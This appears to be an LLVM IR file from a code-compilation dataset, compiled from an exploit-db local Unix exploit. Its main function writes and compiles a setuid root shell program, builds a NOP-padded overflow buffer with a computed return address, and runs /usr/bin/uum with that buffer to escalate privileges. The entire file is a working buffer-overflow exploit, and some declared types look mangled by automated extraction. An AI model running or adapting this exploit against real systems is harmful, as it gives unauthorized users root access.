; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19582.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19582.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@exec = common dso_local global i32 0, align 4
@SHELL = common dso_local global i8* null, align 8
@xx = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"%s.c\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@fp = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"Can not write to %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"main(){setuid(0);setgid(0);system(\22/bin/sh\22);}\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"%s %s.c -o %s\00", align 1
@COMPILER = common dso_local global i8* null, align 8
@sp = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@MAXBUF = common dso_local global i64 0, align 8
@JMP_OFS = common dso_local global i32 0, align 4
@ip = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [22 x i8] c"Jumping address = %x\0A\00", align 1
@RET_ADR = common dso_local global i64 0, align 8
@EXP_ADR = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [13 x i8] c"/usr/bin/uum\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"uum\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-D\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = load i32, i32* @exec, align 4
  %2 = load i8*, i8** @SHELL, align 8
  %3 = call i32 @strcat(i32 %1, i8* %2)
  %4 = load i8*, i8** @xx, align 8
  %5 = load i8*, i8** @SHELL, align 8
  %6 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* %5)
  %7 = load i8*, i8** @xx, align 8
  %8 = call i32* @fopen(i8* %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %8, i32** @fp, align 8
  %9 = icmp eq i32* %8, null
  br i1 %9, label %10, label %14

10:                                               ; preds = %0
  %11 = load i8*, i8** @xx, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %11)
  %13 = call i32 @exit(i32 1) #3
  unreachable

14:                                               ; preds = %0
  %15 = load i32*, i32** @fp, align 8
  %16 = call i32 @fprintf(i32* %15, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0))
  %17 = load i32*, i32** @fp, align 8
  %18 = call i32 @fclose(i32* %17)
  %19 = load i8*, i8** @xx, align 8
  %20 = load i8*, i8** @COMPILER, align 8
  %21 = load i8*, i8** @SHELL, align 8
  %22 = load i8*, i8** @SHELL, align 8
  %23 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %19, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* %20, i8* %21, i8* %22)
  %24 = load i8*, i8** @xx, align 8
  %25 = call i32 @system(i8* %24)
  %26 = call i32 (...) @get_sp()
  store i32 %26, i32* @sp, align 4
  %27 = load i8*, i8** @xx, align 8
  %28 = load i32, i32* @NOP, align 4
  %29 = load i64, i64* @MAXBUF, align 8
  %30 = call i32 @memset(i8* %27, i32 %28, i64 %29)
  %31 = load i32, i32* @sp, align 4
  %32 = load i32, i32* @JMP_OFS, align 4
  %33 = sub nsw i32 %31, %32
  store i32 %33, i32* @ip, align 4
  %34 = load i32, i32* @ip, align 4
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0), i32 %34)
  %36 = load i32, i32* @ip, align 4
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  %39 = load i8*, i8** @xx, align 8
  %40 = load i64, i64* @RET_ADR, align 8
  %41 = getelementptr inbounds i8, i8* %39, i64 %40
  store i8 %38, i8* %41, align 1
  %42 = load i32, i32* @ip, align 4
  %43 = ashr i32 %42, 8
  %44 = and i32 %43, 255
  %45 = trunc i32 %44 to i8
  %46 = load i8*, i8** @xx, align 8
  %47 = load i64, i64* @RET_ADR, align 8
  %48 = add i64 %47, 1
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  store i8 %45, i8* %49, align 1
  %50 = load i32, i32* @ip, align 4
  %51 = ashr i32 %50, 16
  %52 = and i32 %51, 255
  %53 = trunc i32 %52 to i8
  %54 = load i8*, i8** @xx, align 8
  %55 = load i64, i64* @RET_ADR, align 8
  %56 = add i64 %55, 2
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  store i8 %53, i8* %57, align 1
  %58 = load i32, i32* @ip, align 4
  %59 = ashr i32 %58, 24
  %60 = and i32 %59, 255
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** @xx, align 8
  %63 = load i64, i64* @RET_ADR, align 8
  %64 = add i64 %63, 3
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  store i8 %61, i8* %65, align 1
  %66 = load i8*, i8** @xx, align 8
  %67 = load i32, i32* @EXP_ADR, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i32, i32* @exec, align 4
  %71 = load i32, i32* @exec, align 4
  %72 = call i32 @strlen(i32 %71)
  %73 = call i32 @strncpy(i8* %69, i32 %70, i32 %72)
  %74 = load i8*, i8** @xx, align 8
  %75 = load i64, i64* @MAXBUF, align 8
  %76 = getelementptr inbounds i8, i8* %74, i64 %75
  store i8 0, i8* %76, align 1
  %77 = load i8*, i8** @xx, align 8
  %78 = call i32 @execl(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %77, i8* null)
  ret i32 0
}

declare dso_local i32 @strcat(i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
